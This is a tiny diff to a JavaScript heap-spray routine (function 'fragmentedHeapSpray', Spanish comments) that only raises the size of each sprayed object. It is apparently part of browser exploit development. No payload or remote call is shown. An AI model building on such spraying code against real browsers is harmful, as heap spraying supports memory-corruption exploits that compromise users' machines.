@@ -1,6 +1,6 @@
 (function() {
     const sprayArray = [];
-    const largeObjectSize = 0x999000;  // 10 MB por objeto
+    const largeObjectSize = 0x999999;  // 10 MB por objeto
     const iterations = 150;            // Iteraciones para ocupación progresiva
 
     async function fragmentedHeapSpray() {
